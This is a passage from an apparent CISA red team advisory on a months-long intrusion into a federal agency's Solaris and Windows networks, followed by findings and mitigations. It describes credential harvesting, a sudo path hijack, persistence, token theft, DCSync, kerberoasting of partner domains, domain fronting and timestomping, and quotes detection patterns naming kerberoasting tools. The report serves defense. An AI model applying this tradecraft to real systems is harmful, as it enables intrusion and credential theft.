  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%203%20-%20Example%20of%20Lateral%20Movement%20in%20the%20Solaris%20Enclave.jpg?itok=5lQGbEQE\" width=\"1024\" height=\"430\" alt=\"Figure 3: Example of Lateral Movement in the Solaris Enclave\">


</div>
  </figure>
<h6>Figure 3: Example of Lateral Movement in the Solaris Enclave</h6>
<p>Once on other internal hosts, the team data mined each for sensitive information and credentials. They obtained personally identifiable information (PII), shadow files, a crackable pass-phrase protected administrator SSH key, and a plaintext password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/003/\" title=\"Unsecured Credentials: Bash History\">T1552.003</a>] in a user’s <code>.bash_history</code>. These data mined credentials provided further avenues for unprivileged access through the network. The team also used SSH tunnels to remotely mount Network File System (NFS) file shares, spoofing <code>uid</code>&nbsp;and <code>gid</code>&nbsp;values to access all files and folders.</p>
<p>To protect against reboots or other disruptions, the team primarily persisted on hosts using the <code>cron</code>&nbsp;utility [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/003/\" title=\"Scheduled Task/Job: Cron\">T1053.003</a>], as well as the <code>at</code> utility [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/002/\" title=\"Scheduled Task/Job: At\">T1053.002</a>], to run scheduled tasks and blend into the environment. Additionally, SSH private keys provided persistent access to internal pivot hosts and would have continued to enable access even if passwords were rotated.</p>
<h5><em>Full Enclave Compromise</em></h5>
<p>Although ACCOUNT 1 allowed the team to move laterally to much of the Solaris enclave, the account did not provide privileged access to all hosts in the network because a subset of hosts had changed the password (which denied privileged access via that account). However, the team analyzed recent user logins using the <code>last</code> command and identified a network security appliance scanning service account (ACCOUNT 2) that logged in regularly to an internal host using password-based authentication. As part of its periodic vulnerability scanning, ACCOUNT 2 would connect to each host via SSH and run <code>sudo</code> with a relative path instead of the absolute path <code>/usr/local/bin/sudo</code>. The local path created a path hijack vulnerability, which allowed the red team to hijack the execution flow and capture the account’s password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/007/\" title=\"Hijack Execution Flow: Path Interception by PATH Environment Variable\">T1574.007</a>].</p>
<p>The harvested password granted unrestricted privileged access to the entire Solaris enclave.</p>
<h5><em>Exploitation of the Windows Domain</em></h5>
<p>While the compromise of the Solaris enclave facilitated months of persistent access to sensitive systems, including web applications and databases, it did not lead to the immediate compromise of the corporate Windows environment. Once in the Windows domain, the red team identified several service accounts with weak passwords. It is likely that an adversary could have continued the Solaris attack path through prolonged password spraying attacks, or by leveraging credentials obtained externally (e.g., dark web credential dumps) (see Figure 4).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%204%20-%20Exploitation%20of%20Solaris%20Enclave.jpg?itok=DQzHfaVi\" width=\"1024\" height=\"498\" alt=\"Figure 4: Exploitation of Solaris Enclave\">


</div>
  </figure>
<h6>Figure 4: Exploitation of Solaris enclave</h6>
<p>The team exploited the Windows domain through other access vectors and eventually proved the undetected pivot between the domains could be made after they obtained Windows credentials.</p>
<h5><em>Reconnaissance and Initial Access</em></h5>
<p>While attempting to pivot into Windows from Solaris, the red team conducted open source information gathering about the organization. They harvested employee names [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/003/\" title=\"Gather Victim Identity Information: Employee Names\">T1589.003</a>] and used the information to derive email addresses based on the target’s email naming scheme. After identifying names, emails, and job titles, the team selected several phishing targets who regularly interacted with the public [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1591/004/\" title=\"Gather Victim Org Information: Identify Roles\">T1591.004</a>]. One user triggered a phishing payload that provided initial access to a workstation.</p>
<p>The team then placed a simple initial access RAT on the workstation in a user-writable folder and obtained user-level persistence through an added registry run key, which called back to a red team redirector via HTTPS. The team assessed what was running on the host in terms of antivirus (AV) and Endpoint Detection and Response (EDR) and used the implant to inject a more capable, full-fledged RAT directly into memory, which pointed to a separate redirector. The assessed organization’s tools failed to categorize C2 traffic as anomalous even when a bug in one of the implants caused 8 GB of continuous network traffic to flow in one afternoon.</p>
<h5><em>Credentialed Access and Privilege Escalation</em></h5>
<p>Internal network information was freely available to unprivileged, domain-joined users, and the team queried hundreds of megabytes of Active Directory (AD) data using a custom rewrite of <code>dsquery.exe</code> in <code>.NET</code> and Beacon Object File (BOF) <code>ldapsearch</code> from the phished user’s workstation. The team then data mined numerous internal file servers for accessible shares [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>]. The team found a password file left from a previous employee on an open, administrative IT share, which contained plaintext usernames and passwords for several privileged service accounts. With the harvested Lightweight Directory Access Protocol (LDAP) information, the team identified one of the accounts (ACCOUNT 3) had system center operations manager (SCOM) administrator privileges and domain administrator privileges for the parent domain. They identified another account (ACCOUNT 4) that also had administrative permissions for most servers in the domain. The passwords for both accounts had not been updated in over eight years and were not enrolled in the organization’s identity management (IDM).</p>
<h5><em>Lateral Movement and Persistence</em></h5>
<p>The team used valid accounts and/or tokens with varied techniques for lateral movement. Techniques included scheduled task manipulation, service creation, and application domain hijacking [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/014/\" title=\"Hijack Execution Flow: AppDomainManager\">T1574.014</a>]. For credential usage, the implemented IDM in the organization’s network hampered the red team’s ability to pivot as it blocked common credential manipulation techniques like pass-the-hash [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a>] and pass-the-ticket [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/003/\" title=\"Use Alternate Authentication Material: Pass the Ticket\">T1550.003</a>]. The red team found ways to circumvent the IDM, including using plaintext passwords to create genuine network logon sessions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/003/\" title=\"Access Token Manipulation: Make and Impersonate Token\">T1134.003</a>] for certain accounts not registered with the IDM, as well as impersonating the tokens of currently logged-in users to piggyback off valid sessions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/001/\" title=\"Access Token Manipulation: Token Impersonation/Theft\">T1134.001</a>].</p>
<p>The red team tailored payloads to blend with the network’s environment and did not reuse IOCs like filenames or file hashes, especially for persisted implants. Remote queries for directory listings, scheduled tasks, services, and running processes provided the information for the red team to masquerade as legitimate activity [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/004/\" title=\"Masquerading: Masquerade Task or Service\">T1036.004</a>].</p>
<p>The team emulated normal network activity by installing HTTPS beaconing agents on workstations where normal users browse the web, establishing internal network pivots with TCP bind and SMB listeners. They primarily relied on creating Windows services as their persistence mechanism.</p>
<p>The red team used the data mined credentials for ACCOUNT 3 to move laterally from the workstation to a SCOM server. Once there, using ACCOUNT 4, the team targeted a Systems Center Configurations Manager (SCCM) server, as it was an advantageous network vantage point. The SCCM server had existing logged-in server administrators whose usernames followed a predictable naming pattern (correlating administrative roles and privilege levels), allowing them to determine which account to use to pivot to other hosts.&nbsp;</p>
<p>The team targeted the organization’s jump servers frequented by highly privileged administrative accounts. Red team operators used stolen SCCM server administrator credentials to compromise one of the organization’s server-administrator jump hosts. They learned that the organization separated some, but not all, accounts onto separate jump servers by role (e.g., workstation administrators and server administrators had separate jump points, but server and domain administrators occasionally shared the same jump hosts). Once a domain administrator logged in, the red team stole the administrator’s session token and laterally moved to a domain controller where they pulled credentials for the entire domain via <code>DCSync</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/006/\" title=\"OS Credential Dumping: DCSync\">T1003.006</a>], obtaining full domain compromise (see Figure 5).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%205%20-%20Exploitation%20of%20the%20Windows%20Domain.jpg?itok=xZHx9Pi4\" width=\"720\" height=\"540\" alt=\"Figure 5: Exploitation of the Windows Domain\">


</div>
  </figure>
<h6><em><strong>Figure&nbsp;5: Exploitation of the Windows Domain</strong></em></h6>
<p>After compromising the domain, the team confirmed access to sensitive servers, including multiple high value assets (HVAs) and tier zero assets. None of the accessed servers had any noticeable additional protections or network access restrictions despite their sensitivity and critical functions in the network. Remote administration and access of these critical systems should be restricted to designated, role-based accounts coming from specific network enclaves and/or workstations. Isolation with these access vector limitations protects them from compromise and sharply reduces the associated noise, allowing defenders to more easily identify abnormal behavior.</p>
<h5><em>Pivoting Into External Trusted Partners</em></h5>
<p>The team inspected the organization’s trust relationships with other organizational domains through LDAP [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>] and identified connections to multiple external FCEB partner organizations, one of which they subsequently used to move laterally.</p>
<p>The team pulled LDAP information from PARTNER DC 1 and kerberoasted the domain, yielding one valid service account with a weak password they quickly cracked, but the team was unable to move laterally with this account because it lacked appropriate privileges. However, PARTNER 1 had trusted relationships with a second partner’s domain controller (PARTNER DC 2). Using the acquired PARTNER 1 credentials, the red team discovered PARTNER 2 also had a kerberoastable, highly privileged administrative service account whose password cracked, allowing the team to laterally move to a PARTNER 2 host from the original victim network (see Figure 6).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%206%20-%20Path%20of%20Exploitation%20into%20External%20FCEB%20Organizations.jpg?itok=nAIxe-Bo\" width=\"1024\" height=\"486\" alt=\"Figure 6: Path of Exploitation into External FCEB Organizations\">


</div>
  </figure>
<h6>figure 6: path of exploitation into external fceb organizations</h6>
<p>These cross-organizational attack paths are rarely identified or tested in regular assessments or audits due to network ownership, legal agreements, and/or vendor opacity. However, they remain a valuable access vector for advanced persistent threat (APT) actors.</p>
<p>Experimentation with access into trusted partner domains included the modification of local system firewall rules on the source domain controller to allow specific source and destination IPs. The organization’s host-based monitoring systems failed to identify the addition and removal of the red team’s firewall exceptions.</p>
<h5><em>Defense Evasion Techniques</em></h5>
<p><em><strong>Solaris Enclave </strong></em><a><em><strong>Figure&nbsp;</strong></em></a><em><strong>5: Exploitation of the Windows Domain</strong></em></p>
<p>Due to the lack of application allowlisting, the red team regularly masqueraded as legitimate software to remain undetected by the organization’s network defenders [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>]. Additionally, by default, command auditing in Solaris via the <code>lastcomm</code> command only captures the program being run—full file path and any command line arguments are not recorded. For example:</p>
<ul>
<li>A real file: <code>/opt/splunkforwarder/bin/splunkd</code></li>
<li>A malicious copy:&nbsp;<code>/opt/splunkforwarder/splunkd</code></li>
<li>Command auditing logs: <code>splunkd</code></li>
</ul>
<p>The team also hid common artifacts to obfuscate their operational activity, including modifying file timestamps [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/006/\" title=\"Indicator Removal: Timestomp\">T1070.006</a>]&nbsp;and permissions with the <code>touch</code> and <code>chmod/chown</code> commands [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1222/002/\" title=\"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\">T1222.002</a>] to blend with other files in the environment.</p>
<p><em><strong>Windows Domain</strong></em></p>
<p>The team used a diverse range of accounts, backdoors, and C2 channels with different network footprints to obfuscate activity [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a>].</p>
<p>Diversification of account usage, backdoors, and C2 channels further obfuscated red team activity in the domain. Lateral movement to new hosts featured a variety of accounts to reduce the risk of detection. When harvesting credentials, the team selected several backup accounts for each role (e.g., server admin, workstation admin, domain admin, service accounts) in case the intended account was locked, disabled, or flagged as compromised.</p>
<p>To emphasize the value of tool-agnostic/behavior-based detections, the red team deployed over seven different implants to mimic real-world adversaries’ diverse use of open source, commercial off-the-shelf (COTS), and custom RATs. Each featured different host and network signatures to evade out-of-the-box EDR detections and every implant had unique artifacts both on-disk and in-memory. The team also evaded EDR/AV by using proprietary loaders and beacon object files (BOFs) to make direct API calls and allow self-injection of <code>.NET</code> executables to run additional capabilities.</p>
<p>All the deployed tools had different network C2 channel footprints. Some beaconing agents connected via HTTPS to legitimate domains owned by the red team. Others used domain fronting [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/004/\" title=\"Proxy: Domain Fronting\">T1090.004</a>] to leverage common content delivery network (CDN) functionality. Outbound traffic sent to public websites not owned by the red team had a <code>Host</code>&nbsp;header that told the CDN provider it should redirect traffic to red-team-controlled IP addresses. Internal pivots used SMB on port <code>445</code> and TCP bind listeners on ephemeral high ports. The team tailored both to mimic named pipes and network connections already seen in the domain and evade detection.</p>
<h4><strong>Collaborative Phase</strong></h4>
<p>Five months into the assessment, the red team officially notified the organization’s security operations center (SOC) of the ongoing activity and began engaging directly with SOC leadership. At this point, the organization had not submitted deconflictions and did not appear to be actively investigating CISA SILENTSHIELD assessment activity.</p>
<p>During this phase, CISA refrained from providing TTPs or IOCs (such as concrete hosts, filenames, or C2 domains) to allow the organization to develop and test its own detection metrics. The team held weekly discussions with the organization’s senior technical staff, SOC, and system administrators, which led to measurable improvements in response times for known techniques and behavior-based detections that uncovered previously unknown tradecraft. Specifically, the red team worked with the organization to assist them with synthesizing the following data sources to identify the extent of the red team’s compromise:</p>
<ul>
<li>EDR alerts;</li>
<li>YARA scans;</li>
<li>C2 domains and techniques;</li>
<li>Internal pivot hosts;</li>
<li>Admin accounts used to pivot;</li>
<li>Memory dumps, revealing attempts to pass credentials; and</li>
<li>Email logs documenting the initial breach via phishing.</li>
</ul>
<p>Every cyber threat actor has a unique set of TTPs. Nevertheless, nearly all adversaries perform the same basic steps:</p>
<ul>
<li>Command execution (initial access and lateral movement);</li>
<li>Establish C2 channels and exfiltrate data;</li>
<li>Establish persistence;</li>
<li>Escalate privileges; and</li>
<li>Use and abuse credentials.</li>
</ul>
<p>All TTPs have corresponding artifacts, but not all IOCs are created equal. Fixating on a hyper-focused set of IOCs can catch known threats but impedes efforts to identify unknown adversaries employing different TTPs.</p>
<p>Major themes discussed during this phase that improved the organization’s behavior-based detection capabilities included log collection, forensic analysis, relying on IOCs for detection, monitoring and investigation management, and Sysmon misconfigurations.</p>
<h5><em>Log Collection</em></h5>
<p>The assessed organizations had ineffective and insufficient logs, and network defenders were not using logs to proactively detect anomalous behavior. With the red team’s assistance, the organization identified logging issues caused by hardware failures, limited backups, network bandwidth, and limited log collection and retention policies (only 60–90 days). In other cases, critical data was captured but not analyzed because artifacts were moved to cold storage.</p>
<p>The organization’s network defenders identified procedural and other roadblocks when attempting to acquire new forensic data. For example, affected servers could not be taken offline for imaging because there was no process in place to do so without impacting the organization’s operations. Additionally, attempts to capture forensic data via packet captures occurred directly on the compromised Solaris and Windows hosts, where the red team observed the data being collected and therefore had the opportunity to disrupt collection, tamper with evidence files, and better adapt and evade their defenses.</p>
<h5><em>Forensic Analysis</em></h5>
<p>Defenders did not monitor C2 egress via DNS. They believed their parent entity was monitoring their DNS traffic, absolving them of a need to collect and monitor logs for their analyses.</p>
<p>Forensic analysts blindly trusted the timestamps for files and persistence mechanisms without realizing they had been tampered with. Bogus times added to persistence mechanisms (such as scheduled tasks) led defenders to misjudge the timeline of the breach. Red team operators regularly adjusted the last-modified timestamp of files and folders—using either the native<code> touch -r</code> command or implants’ <code>timestomp</code> command to disguise the last-modified timestamp captured in the output of <code>ls –la</code>. Secondary file timestamps identified with <code>ls -lu</code> or <code>ls -lc</code> would have revealed abnormal file attributes, in addition to more reliable anomalies found during proper forensic investigation.</p>
<h5><em>Reliance on Known IOCs</em></h5>
<p>The red team used diversified TTPs in the Adversary Emulation phase to reflect the ability of cyber threat actors to bypass conventional, known-bad detection strategies. The network defenders did not detect much of the team’s activity. For example:</p>
<ul>
<li>After identifying a red team payload, network defenders wrote tailored YARA rules that signatured specific behavior of the red team’s loader, which uncovered several similar payloads but failed to catch any of the other six C2 frameworks.</li>
<li>Organization network defenders used a combination of custom and open source detection rules (such as <code>CommandLine=kerberoast*</code> or files called <code>bloodhound.zip</code>) and did not detect the team’s kerberoasting activity.</li>
</ul>
<h5><em>Regular Monitoring and Investigation Management</em></h5>
<p>Conversations with SOC leadership revealed several procedural issues that led to slow or incomplete analysis of the red team’s intrusion and activity. For example:</p>
<ul>
<li>While EDR products detected and quarantined several of the red team’s tools, including the initial phishing payload, the organization’s daily procedures did not always include review of EDR alerts. The red team worked with the organization to ensure rapid response to EDR alerts became a fundamental part of network defenders’ daily workflows. This allowed SOC personnel to identify new attempts at lateral movement.</li>
<li>Solaris network owners discovered that several firewalls had inadvertently been misconfigured or disabled. The organization’s technical teams worked directly with the red team to fix errors and to reorganize and revalidate the network topology.</li>
<li>Network defenders had poor operational security and alerted the red team of investigations. For example:
<ul>
<li>In one instance, after receiving incoming beacons from what was evidently a sandboxed environment, the payload was not renamed from its original file, allowing the red team to immediately identify how much of their access was under scrutiny. Organizations must ensure sandboxed environments are safe, secure, and thoroughly sandboxed.</li>
<li>The red team observed system administrators reviewing forensic artifacts tied to the team’s Solaris payload—searching for files, running packet captures for outbound C2 traffic, and port scanning the C2 redirector. Team members simply reinstalled their persistence with a new redirector and file path, sidestepping the informal investigation.</li>
</ul>
</li>
<li>IT teams were siloed from the SOC, who had no knowledge of the system administrator’s weeks long investigation into the anomalous network behavior.</li>
<li>While the organization compartmented most of its threat hunting and incident response in a separate domain, staff still used the compromised corporate domain accounts to communicate the details of active investigations and assessments.</li>
</ul>
<h5><em>Sysmon Misconfigurations</em></h5>
<p>The red team had a productive exchange with the organization on their Sysmon configuration, which the team abused throughout the assessment. The red team identified several misconfigurations:</p>
<ul>
<li>Deployment teams pushed the ruleset (stored as a <code>.xml</code> file) to a globally readable <code>C:\\Windows</code> directory. There were no rules in place to catch adversaries reading the configurations from disk or the registry. As a result, CISA’s red team was provided explicit file paths to safely place their payloads.</li>
<li>Rules targeted a single, tool-specific IOC rather than a technique (e.g., <code>sc.exe</code> rather than service creation events).</li>
<li>Exceptions were overly permissive (for example, excluding all Image entries anywhere in <code>C:\\Program Files (x86)\\Google\\Update\\*</code>).</li>
</ul>
<h3>LESSONS LEARNED AND KEY FINDINGS</h3>
<p>The red team noted the following lessons learned and key findings relevant to the security of the assessed organization’s network. These specific findings contributed to the team’s ability to gain persistent access across the organization’s network. See the Mitigations section for recommendations on how to address these findings.</p>
<h4>Lesson Learned: The assessed organization had insufficient controls to prevent and detect malicious activity.</h4>
<ul>
<li><strong>Finding #1: The organization’s perimeter network was not adequately firewalled from its internal network, which failed to restrict outbound traffic.</strong> A majority of the organization’s hosts, including domain controllers, had internet connectivity to broad AWS EC2 ranges, allowing the red team to make outbound web requests without triggering IDS/IPS responses. These successful connections revealed the lack of an application layer firewall capable of detecting protocol mismatches on common ports.</li>
<li><strong>Finding #2: The assessed organization had insufficient network segmentation</strong><em><strong>.</strong>&nbsp;</em>The lack of network segmentation allowed the red team to move into, within, and out of both the Solaris and Windows domain. This also enabled them to gather a massive amount of data about the organization and its systems. Internal servers could reach almost any other domain host, regardless of type (server vs. workstation), purpose (user laptop, file server, IDM server, etc.), or physical location. Use of network address translation (NAT) between different parts of the network further obfuscated data streams, hindering incident response.</li>
<li><strong>Finding #3: The organization had trust relationships with multiple partner organizations,&nbsp;</strong>which—when combined with weak credentials and network connectivity—allowed the red team to exploit and move laterally to a partner domain controller. This highlights the risk of blindly allowing third party network connectivity and the importance of regularly monitoring both privileged access and transitive trusted credential material<strong>.</strong></li>
<li><strong>Finding #4: The organization’s defensive staff did not sufficiently isolate their defensive investigative activity.</strong> Organizations should always communicate information pertaining to suspected incidents out-of-band, rather than from within a domain that they know to be compromised. While the defensive systems were shunted to another domain with correct (one-way) trusts, the red team identified a likely attack vector to that domain via the same, previously compromised IDM server. Some analysts also performed dynamic analysis of suspected implants from an internet-connected sandbox, tipping the red team to the specific files and hosts that were under investigation.</li>
<li><strong>Finding #5: Network defenders were not familiar with the intricacies of their IDM solution.</strong> The CISA red team identified accounts not enrolled in the IDM and successfully used those and already existing user access tokens to bypass IDM. The appliance, in its active configuration, was not exhaustively tested against common credential manipulation techniques nor were any alerts on anomalous behavior being monitored.</li>
<li><strong>Finding #6: The organization had some role-based host segmentation, but it was not granular enough.</strong> The organization used clearly defined roles (server administrator and domain administrator) but did not sufficiently segregate the accounts to their own servers or systems, enabling privilege escalation.</li>
</ul>
<h4>Lesson Learned: The organization did not effectively or efficiently collect, retain, and analyze logs.</h4>
<ul>
<li><strong>Finding #7</strong>: <strong>Defensive analysts did not have the information they needed</strong> due to a combination of issues with collecting, storing, and processing logs. Other policies collected too much useless data, generating noise and slowing investigation.</li>
<li><strong>Finding #8: Network defenders’ daily procedures did not always include analysis of EDR alerts</strong>, and the tools that were installed only provided a 30-day retention for quarantined files. Consequently, investigators were unable to access timely information that may have led to earlier detection of the red team’s activity.</li>
<li><strong>Finding #9: Forensic analysts trusted host artifacts that could have been modified by an adversary.&nbsp;</strong>In particular, file timestamps and packet captures were scrutinized without considering the possibility of malicious tampering.</li>
</ul>
<h4>Lesson Learned: Bureaucratic communication and decentralized teams hindered the organization’s network defenders.</h4>
<ul>
<li><strong>Finding #10: The organization’s technical staff were spread across decentralized teams.</strong> Siloed team structure meant that IT, security, and other technical teams lacked consistency with their tools, creating too much noise for defenders to sift through.</li>
<li><strong>Finding #11: The SOC team lacked the agency to rapidly update or deploy rulesets through the fractured IT teams</strong>. The organization diffused responsibility for individual tools, such as Sysmon, across multiple groups, hampering timeliness and maintenance of a defensive posture.</li>
<li><strong>Finding #12</strong>: <strong>The organization’s forensics team produced an incident response report which documented the red team’s initial exploitation of the Solaris enclave. However, the report was limited in scope and did not adequately document the red team’s ability to expand and persist</strong>.&nbsp;The success of the red team’s first phase, using publicly known TTPs, illustrated the business risk to all Solaris hosts and, by extension, the Windows environment. Moreover, the organization’s internal report only focused on vulnerable servers and did not account for a cyber threat actor’s ability to expand and persist in the Solaris enclave.
<ul>
<li>The Solaris administrator’s investigations of the red team failed to appear in either the report or in SOC deconflictions. An admin’s inquiry into unusual and probably malicious activity, particularly in the middle of an investigation of confirmed breaches of adjacent hosts, should have been considered in the report as evidence of lateral movement.</li>
</ul>
</li>
</ul>
<h4>Lesson Learned: A “known-bad” detection approach hampered detection of alternate TTPs.</h4>
<ul>
<li><strong>Finding #13</strong>: <strong>Defenders hyper-focused on specific IOCs, such as file attributes, particular C2 frameworks, or C2 domains.&nbsp;</strong>The organization’s network defenders did not initially employ tool-agnostic detections, causing them to positively identify some red team tools, but remain blind to the full extent of the compromise. They were accustomed to catching internal red teams that used specific TTPs; introducing a new “threat actor” with new TTPs sidestepped nearly all detections.</li>
<li><strong>Finding #14</strong>: <strong>Detection rules were visible from compromised systems</strong>, allowing the red team to sidestep detections based on hardcoded rules and exceptions.</li>
<li><strong>Finding #15: There was insufficient restriction of administrative tools.</strong> The technical staff lacked a standardized set of administrative tools, leaving all remote administration protocols available for use by admins, CISA red team, or adversaries. This also created excessive noise for defenders to effectively sift through to determine expected versus anomalous activity.</li>
<li><strong>Finding #16: There was insufficient tracking of software</strong>. There was no apparent approval or tracking process for software installation across the domain, preventing defensive analysts from identifying abnormal software placed by the red team. A comprehensive inventory of approved software would help defenders identify abnormal behavior and facilitate the deployment of application allow-listing.</li>
</ul>
<h3>NOTED STRENGTHS</h3>
<p>The assessed organization promptly planned for and resolved multiple identified issues, including with:</p>
<ul>
<li><strong>Windows service accounts</strong>: The organization eliminated over 30 percent of service accounts which were deemed unnecessary. There is an on-going effort to change service account passwords and apply DoD recommended STIG compliance (over 85 percent have been changed since the publication of this report).</li>
<li><strong>IDM</strong>: The organization is looking into how to improve their IDM implementation and apply additional security alerts and preventions for possible misuse of credentials. They plan to implement additional identity-based monitoring capabilities in front of tier zero assets.</li>
<li><strong>Egress</strong>: The organization implemented new processes to detect and prevent servers from anomalously egressing outside of the network to the internet.</li>
<li><strong>Host-based solutions</strong>: The organization used additional features of their antivirus software, such as reputation scores, to look for all executable file type outliers of to identify anomalous instances.</li>
<li><strong>Hosts</strong>: The organization decommissioned clusters of servers and completely rebuilt them from scratch after identifying numerous irreparable issues and misconfigurations.</li>
<li><strong>Solaris credentials</strong>: The organization changed passwords, removed SSH keys, restricted permissions, and removed unnecessary accounts.</li>
</ul>
<h3>MITIGATIONS</h3>
<h4><strong>Network Defenders</strong></h4>
<p>CISA recommends organizations implement the recommendations in Table 1 to mitigate the findings listed in the Lessons Learned and Key Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. See CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Recommendations to Mitigate Identified Issues</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Finding</strong></th>
<th role=\"columnheader\"><strong>Recommendation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Inadequate firewall between perimeter and internal devices</td>
<td>
<ul>
<li>Deploy internal and external network firewalls to inspect, log, and/or block unknown or unauthorized traffic.</li>
<li>Perform deep packet inspection to detect mismatched application traffic or encrypted data flows.</li>
<li>Restrict outbound internet egress to hosts whenever possible.</li>
<li>Establish a baseline of normal user activity, including unique IPs or domains.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient Network Segmentation</td>
<td>
<ul>
<li>Apply the principle of least privilege to limit the exposure of systems and services in the demilitarized zone (DMZ).</li>
<li>Segment the DMZ based on the sensitivity of systems and services as well as the internal network [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>].</li>
<li>Segment networks to protect assets and workstations from direct exposure to the internet by considering the criticality of the asset to business functions, sensitivity of the data traversing the asset, and requirements for internet access to the asset.</li>
<li>Implement and regularly test firewalls, access control lists, and intrusion prevention systems.</li>
<li>Take advantage of opportunities to create natural network segmentation. Securely configured VPNs used for remote laptops, for instance, create an easy place to filter and monitor incoming traffic.</li>
</ul>
</td>
</tr>
<tr>
<td>Trust relationships between domains were overly permissive</td>
<td>
<ul>
<li>Restrict network connectivity (ingress and egress) to only necessary services between trusted domains [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Regularly monitor privileged access via Foreign Security Principals (FSPs).</li>
</ul>
</td>
</tr>
<tr>
<td>Defensive activity was not sufficiently isolated</td>
<td>
<ul>
<li>Perform network defense investigations out-of-band [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li>Conduct regular security audits and penetration testing by internal and external parties.</li>
<li>Develop and implement a comprehensive Incident Response Plan (IRP) and conduct regular drills and simulations [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentResponseIRPlans2S\" title=\"Incident Response (IR) Plans (2.S)\">CPG 2.S</a>].</li>
</ul>
</td>
</tr>
<tr>
<td>IDM solutions were not fully understood and utilized</td>
<td>
<ul>
<li>Enroll all accounts in IDM solutions and test against common credential manipulation techniques.</li>
<li>Integrate the IDM solution with other systems and applications, allowing for the streamlining of workflows.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient role-based host segmentation</td>
<td>
<ul>
<li>Establish Role-Based Access Controls (RBAC) to systematically assign permissions based on job functions [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Implement a comprehensive security model incorporating micro-segmentation at the host level.</li>
</ul>
</td>
</tr>
<tr>
<td>Failure to monitor EDR alerts daily</td>
<td>
<ul>
<li>Develop and document Standard Operating Procedures (SOPs) for handling EDR alerts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentPlanningandPreparedness5A\" title=\"Incident Planning and Preparedness (5.A)\">CPG 5.A</a>].</li>
<li>Establish and maintain incident response playbooks.</li>
<li>Conduct regular audits and reviews of the EDR alert handling process.</li>
</ul>
</td>
</tr>
<tr>
<td>Host artifacts were overly trusted</td>
<td>
<ul>
<li>Operationalize and deploy File Integrity Monitoring (FIM) solutions.</li>
<li>Regularly review and adjust access permissions, adhering to the principle of least privilege [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li>Establish proper forensic processes to ensure integrity.</li>
</ul>
</td>
</tr>
<tr>
<td>Bureaucracy and decentralization of network defenders hampered communication and consistency</td>
<td>
<ul>
<li>Introduce cross-training initiatives to cultivate a collaborative culture.</li>
<li>Encourage the establishment of cross-functional projects.</li>
<li>Utilize collaboration platforms that seamlessly integrate various tools and systems.</li>
</ul>
</td>
</tr>
<tr>
<td>Insufficient internal incident response report&nbsp;</td>
<td>
<ul>
